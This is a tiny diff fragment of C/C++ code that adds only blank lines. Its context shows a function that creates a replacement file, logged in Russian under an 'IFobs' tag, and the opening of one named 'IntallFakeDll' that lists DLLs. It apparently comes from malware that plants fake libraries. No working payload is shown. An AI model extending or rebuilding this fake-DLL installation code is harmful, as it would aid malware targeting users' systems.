@@ -678,6 +678,8 @@ void CreateFileReplacing( const char* s )
 	DBG( "IFobs", "Создали файл '%s'", path );
 }
 
+
+
 DWORD WINAPI IntallFakeDll(void*)
 {
 	const char* dlls[] =
